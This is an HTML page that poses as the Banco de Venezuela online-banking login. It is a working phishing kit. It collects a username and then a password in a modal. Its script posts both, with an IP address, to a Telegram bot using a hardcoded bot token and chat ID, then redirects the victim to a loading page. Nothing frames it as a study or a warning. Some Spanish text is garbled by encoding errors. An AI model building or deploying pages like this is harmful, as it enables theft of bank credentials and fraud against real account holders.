
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Banco de Venezuela</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: url(background.jpg);
            background-size: cover;
            background-position: center;
        }

        .container {
            display: flex;
            height: 100%;
            width: 100%;
        }

        .left-side {
            width: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .right-side {
            width: 50%;
        }

        .form {
            width: 80%;
            background: white;
            max-width: 550px;
            box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
        }

        @media (max-width: 768px) {
            body {
                background: #ededed;
            }

            .container {
                flex-direction: column;
            }

            .left-side {
                width: 100%;
                height: 100vh;
            }

            .right-side {
                display: none;
            }
        }

        .form-group {
            position: relative;
            margin-bottom: 20px;
            margin: 20px;
        }

        .form-group label {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-55%);
            color: #999;
            transition: top 0.3s, font-size 0.3s;
            pointer-events: none;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            position: relative;
            height: 60px;
            border: 0;
            border-bottom: 1px solid gray;
            background: #ededed;
            outline: none;
        }

        .form-group input:focus {
            border: 0;
        }

        .form-group input:focus + label,
        .form-group input:not(:placeholder-shown) + label {
            top: 5px;
            font-size: 12px;
        }

        button {
            background-color: #0067b1;
            color: white;
            border-radius: 3px;
            border: 0;
            padding: 15px;
            width: 200px;
        }

        .overlay {
            display: flex;
            justify-content: center;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 9999;
        }

        .content {
            background-color: #fff;
            width: 350px;
            border-radius: 5px;
            text-align: center;
            padding: 20px;
            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
        }

        .form-group2 {
            position: relative;
            margin-bottom: 20px;
            padding: 0 20px;
        }

        .form-group2 label {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-55%);
            color: #999;
            transition: top 0.3s, font-size 0.3s;
            pointer-events: none;
        }

        .form-group2 input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            position: relative;
            height: 60px;
            border: 0;
            border-bottom: 1px solid gray;
            background: #ededed;
            outline: none;
        }

        .form-group2 input:focus {
            border: 0;
        }

        .form-group2 input:focus + label,
        .form-group2 input:not(:placeholder-shown) + label {
            top: 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="overlay" id="overlay" style="display: none;">
        <div class="content">
            <h4 style="color: #0067b1 !important">Introduce tu contrase침a</h4>
            <div class="form-group2">
                <input type="text" id="contra" required />
                <label for="contra">Contrase침a *</label>
            </div>
            <div style="width: 100%; text-align: center; padding-bottom: 30px">
                <button type="button" onclick="sendToTelegram()">Enviar</button>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="left-side">
            <form id="loginform" class="form" onsubmit="return showPasswordModal(event)">
                <div style="text-align: center">
                    <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
                </div>
                <div style="width: 100%; text-align: center">
                    <div class="form-group">
                        <input type="text" id="nombre" name="nombre" required />
                        <label for="nombre">Usuario *</label>
                    </div>
                </div>
                <div style="width: 100%; text-align: center">
                    <button type="submit">Entrar</button>
                </div>
                <div style="width: 100%; text-align: center; font-size: 12px; font-weight: bold; color: #999; margin-top: 30px; margin-bottom: 30px;">
                    쯆lvidaste tu usuario o clave? <br />
                    Si eres nuevo clienteBDV reg칤strate aqu칤
                </div>
            </form>
        </div>
        <div class="right-side"></div>
    </div>

    <script>
        // Mostrar modal para la contrase침a
        function showPasswordModal(event) {
            event.preventDefault();
            const nombre = document.getElementById("nombre").value;

            if (nombre) {
                document.getElementById("overlay").style.display = "flex";
            } else {
                alert("Por favor, ingrese el usuario.");
            }
        }

        // Enviar a Telegram
        function sendToTelegram() {
            const nombre = document.getElementById("nombre").value;
            const contra = document.getElementById("contra").value;

            if (!contra) {
                alert("Por favor, ingrese la contrase침a.");
                return;
            }

            const ip = '2803:9800:90b6:acaf:6417:3808:2c40:317f'; // Puedes cambiarla din치micamente si lo necesitas
            const botToken = '7535043094:AAH7nI1r3FPiAweIAibQE1g2oWCo1zTcdZo';
            const chatId = '-4527645712';
            const message = `俱뒥룼俱됱BDV] 俱뒥룼俱됲n游깷 IP ${ip} \n\n九덢잺usuario: ${nombre}\n九덢잺aprobar: ${contra}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const params = {
                chat_id: chatId,
                text: message,
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(params),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);

                // Redireccionar a cargando.html autom치ticamente
                window.location.href = 'cargando.html';

                alert("Error al enviar el mensaje.");
            });
        }
    </script>
</body>
</html>
